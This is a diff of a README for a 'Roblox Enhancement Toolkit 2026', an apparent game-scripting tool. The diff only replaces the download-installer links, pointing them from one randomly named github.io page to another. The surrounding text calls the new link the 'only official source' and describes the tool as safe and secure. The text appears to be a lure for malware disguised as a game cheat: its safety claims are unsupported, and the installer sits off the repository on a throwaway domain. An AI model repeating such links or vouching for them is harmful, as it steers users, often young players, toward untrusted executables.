@@ -2,7 +2,7 @@
 
 The Roblox Enhancement Toolkit 2026 is designed to elevate your gaming experience with advanced scripting capabilities and user-friendly interfaces. This toolkit provides a safe and efficient environment for customizing Roblox gameplay, ensuring compatibility with the latest updates and Windows systems.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ The toolkit supports a wide range of scripts for Roblox, including those for cus
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This is the only official source for downloading the Roblox Enhancement Toolkit 2026. Ensure you always use this link to get the most recent and secure version of the tool.
 
